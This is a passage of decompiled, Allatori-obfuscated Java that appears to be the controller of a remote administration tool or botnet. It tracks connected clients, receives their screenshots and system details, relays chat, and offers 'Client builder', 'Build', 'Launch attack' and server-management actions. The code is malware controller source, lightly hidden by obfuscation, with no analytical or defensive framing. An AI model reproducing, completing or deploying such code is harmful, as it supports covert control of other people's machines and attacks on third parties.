            a4.ALLATORIxDEMO(a2, ha2);
            return bl;
        }
        if (class_ == S.class) {
            S s2 = (S)a3;
            a4.ALLATORIxDEMO(a2, s2);
            return bl;
        }
        if (class_ == O.class) {
            O o2 = (O)a3;
            a4.ALLATORIxDEMO(a2, o2);
            return bl;
        }
        if (class_ != Da.class && class_ != Q.class) {
            if (class_ == V.class) {
                return bl;
            }
            bl = false;
        }
        return bl;
    }

    private /* synthetic */ void ALLATORIxDEMO(Na a2, R a3) {
        if (!a2.ALLATORIxDEMO()) {
            return;
        }
        a3 = ((R)a3).ALLATORIxDEMO();
        R r2 = new R();
        a2.k.H(r2);
        ((Tc)a3).H();
    }

    private /* synthetic */ void ALLATORIxDEMO(ca a2) {
        sa a3;
        a2 = ((ca)a2).ALLATORIxDEMO();
        a3.O.ALLATORIxDEMO((String)a2);
    }

    private /* synthetic */ ImageIcon ALLATORIxDEMO(String a22) {
        try {
            a22 = E + (String)a22;
            Object object = ImageIO.read(new URL((String)a22));
            object = new ImageIcon((Image)object);
            return object;
        }
        catch (Exception a22) {
            return null;
        }
    }

    private /* synthetic */ t ALLATORIxDEMO() {
        int n2;
        sa a2;
        String string = a2.O.ALLATORIxDEMO(l);
        if (string == null) {
            return null;
        }
        String string2 = a2.O.ALLATORIxDEMO(m);
        try {
            n2 = Integer.parseInt(string2);
        }
        catch (NumberFormatException numberFormatException) {
            return null;
        }
        t t2 = new t(string, n2);
        return t2;
    }

    private /* synthetic */ void ALLATORIxDEMO(Na a2, p a3) {
        a3 = ((p)a3).ALLATORIxDEMO();
        a2.K.ALLATORIxDEMO((BufferedImage)a3);
    }

    private /* synthetic */ da ALLATORIxDEMO(Na a2) {
        a2 = ((Na)a2).a.E();
        return new da((String)a2);
    }

    private /* synthetic */ u ALLATORIxDEMO(Na a22, boolean a3) {
        if (!a22.H()) {
            return null;
        }
        Na na2 = a22;
        int a22 = na2.K.l();
        int n2 = na2.K.H();
        int n3 = na2.K.D();
        a3 = !a3;
        return new u(a22, n2, n3, (byte)a3);
    }

    private /* synthetic */ Ia ALLATORIxDEMO(Na a2) {
        a2 = ((Na)a2).d.c();
        return new Ia((String)a2);
    }

    private /* synthetic */ void l(Na a2) {
        O o2 = new O();
        Na na2 = a2;
        na2.a.I();
        na2.k.H(o2);
        na2.a.ALLATORIxDEMO(true);
    }

    @Override
    public /* synthetic */ void connected(ActiveServer a2, ta a3) {
        sa a4;
        sa sa2 = a4;
        super.connected((ActiveServer)a2, a3);
        a2 = new Na(a3, a4.Y);
        sa2.T.put(a3, (Na)a2);
    }

    private /* synthetic */ void ALLATORIxDEMO(Na a2, ha a3) {
        ha ha2 = a3;
        a3 = ha2.H();
        String string = ha2.ALLATORIxDEMO();
        long l2 = ha2.D();
        boolean bl = ha2.ALLATORIxDEMO();
        long l3 = ha2.l();
        long l4 = ha2.H();
        long l5 = ha2.ALLATORIxDEMO();
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat();
        String string2 = simpleDateFormat.format(l3);
        String string3 = simpleDateFormat.format(l4);
        String string4 = simpleDateFormat.format(l5);
        String string5 = bl ? w : G;
        a3 = A + MTSCSPacket.ALLATORIxDEMO("\u001f\n") + (String)a3 + DumpMapName.ALLATORIxDEMO(";Y") + f + MTSCSPacket.ALLATORIxDEMO("\u001f\n") + string + DumpMapName.ALLATORIxDEMO(";Y") + h + MTSCSPacket.ALLATORIxDEMO("\u001f\n") + l2 + " " + J + DumpMapName.ALLATORIxDEMO(";Y") + D + MTSCSPacket.ALLATORIxDEMO("\u001f\n") + string5 + DumpMapName.ALLATORIxDEMO(";Y") + L + MTSCSPacket.ALLATORIxDEMO("\u001f\n") + string2 + DumpMapName.ALLATORIxDEMO(";Y") + j + MTSCSPacket.ALLATORIxDEMO("\u001f\n") + string3 + DumpMapName.ALLATORIxDEMO(";Y") + i + MTSCSPacket.ALLATORIxDEMO("\u001f\n") + string4;
        a2.a.ALLATORIxDEMO((String)a3);
    }

    private /* synthetic */ void ALLATORIxDEMO(String a2) {
        sa a3;
        if (a2 == "Close") {
            a3.D();
            return;
        }
        if (a2 == "Client builder") {
            a3.s.ALLATORIxDEMO(true);
            return;
        }
        if (a2 == "Choose file") {
            a3.d();
            return;
        }
        if (a2 == "Build") {
            a3.b();
            return;
        }
        if (a2 == "Launch attack") {
            a3.c();
            return;
        }
        if (a2 == "Add") {
            a3.I();
            return;
        }
        if (a2 == "Remove") {
            a3.E();
            return;
        }
        if (a2 == "Manage servers") {
            a3.n.ALLATORIxDEMO(true);
            return;
        }
        if (a2 == "Start server") {
            a3.l();
            return;
        }
        if (a2 == "Stop server") {
            a3.H();
        }
    }

    private /* synthetic */ void ALLATORIxDEMO(Na a2, Ia a3) {
        a3 = ((Ia)a3).ALLATORIxDEMO();
        Na na2 = a2;
        a2 = na2.E();
        na2.d.m((String)a2 + ": " + (String)a3);
    }

    private /* synthetic */ void c() {
        sa a2;
        a2.O.ALLATORIxDEMO(DumpMapName.ALLATORIxDEMO("\u001dY'\u0016:[#Z6[6X'S7\u0016*S'"));
    }
}

